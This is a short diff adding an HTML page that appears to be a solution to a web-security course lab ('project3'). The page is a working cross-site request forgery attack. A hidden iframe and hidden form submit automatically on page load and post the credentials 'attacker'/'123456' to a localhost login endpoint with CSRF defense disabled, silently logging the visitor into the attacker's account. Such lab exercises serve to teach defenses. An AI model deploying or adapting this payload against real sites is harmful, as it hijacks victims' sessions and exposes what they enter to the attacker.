@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+	<html>
+	<body>
+		<iframe name="csrf0_frame" style="visibility:hidden;">
+		</iframe>	
+		
+		<form id="csrf0_attack" target="csrf0_frame" style="visibility:hidden;"
+			action="http://localhost:34443/project3/login?csrfdefense=0&xssdefense=4" 
+			method="post" class="form-inline">
+			<input type="hidden" id = "username" name="username" value="attacker">
+			<input type="hidden" id = "userpass" name="password" value="123456">
+			<input type="submit" value="Login">
+
+		</form>
+
+	<script>
+		$("#csrf0_attack").submit();
+	</script>
+
+	</body>
+</html>
